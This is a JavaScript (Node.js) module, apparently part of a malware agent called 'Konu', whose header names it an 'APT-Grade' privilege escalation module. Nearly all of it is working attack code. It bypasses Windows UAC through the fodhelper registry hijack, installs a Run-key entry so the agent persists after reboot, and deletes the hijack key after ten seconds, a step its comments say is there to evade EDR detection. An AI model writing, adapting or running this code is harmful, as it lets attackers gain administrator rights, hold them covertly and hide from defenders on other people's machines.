const { execSync } = require('child_process');
const fs = require('fs');
const os = require('os');

/**
 * KONU-MAIN | PRIVILEGE ESCALATION MODULE
 * Version: 2.0 (APT-Grade)
 * Focus: UAC Bypass via Fodhelper
 */

class PrivEsc {
    constructor() {
        this.isWindows = os.platform() === 'win32';
        // Caminho do agente atual
        this.agentPath = process.execPath; 
    }

    async execute() {
        if (!this.isWindows) {
            console.log('[!] Non-Windows system detected. Skipping PrivEsc.');
            return false;
        }

        try {
            if (this.isAdmin()) {
                console.log('[+] Already running with Administrator privileges.');
                return true;
            }

            console.log('[*] Attempting UAC Bypass via Fodhelper...');
            const success = await this.bypassUAC();

            if (success) {
                console.log('[+] Privilege escalation successful. Now running as SYSTEM/Admin.');
                return true;
            } else {
                console.log('[-] UAC Bypass failed. Running with limited privileges.');
                return false;
            }
        } catch (error) {
            console.error(`[-] PrivEsc error: ${error.message}`);
            return false;
        }
    }

    isAdmin() {
        try {
            // Tenta executar um comando que só administradores podem fazer
            execSync('net session', { stdio: 'ignore' });
            return true;
        } catch (e) {
            return false;
        }
    }

    async bypassUAC() {
        /**
         * Técnica: Fodhelper Registry Hijacking
         * O fodhelper.exe é um binário confiável que ignora o UAC.
         * Nós criamos uma chave no registro que redireciona a execução do fodhelper
         * para o nosso agente.
         */
        const registryPath = `HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command`;
        const delegateValue = this.agentPath;

        try {
            // 1. Configura o hijack do ms-settings
            execSync(`reg add "${registryPath}" /v "DelegateExecute" /t REG_SZ /d "${delegateValue}" /f`, { stdio: 'ignore' });
            execSync(`reg delete "${registryPath}" /v "DelegateExecute" /f`, { stdio: 'ignore' });
            execSync(`reg add "${registryPath}" /ve /t REG_SZ /d "${delegateValue}" /f`, { stdio: 'ignore' });

            // 2. Dispara a elevação via fodhelper
            execSync('cmd.exe /c start fodhelper.exe', { stdio: 'ignore' });

            // 3. Persistência: Adiciona o agente ao startup para manter o acesso
            const runKey = `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`;
            execSync(`reg add "${runKey}" /v "KonuAgent" /t REG_SZ /d "${delegateValue}" /f`, { stdio: 'ignore' });

            // 4. Limpeza agendada do registro para evitar detecção de EDR
            setTimeout(() => {
                try {
                    execSync(`reg delete "${registryPath}" /f`, { stdio: 'ignore' });
                } catch (e) {}
            }, 10000);

            return true;
        } catch (e) {
            console.error(`[-] Registry manipulation failed: ${e.message}`);
            return false;
        }
    }
}

module.exports = new PrivEsc();
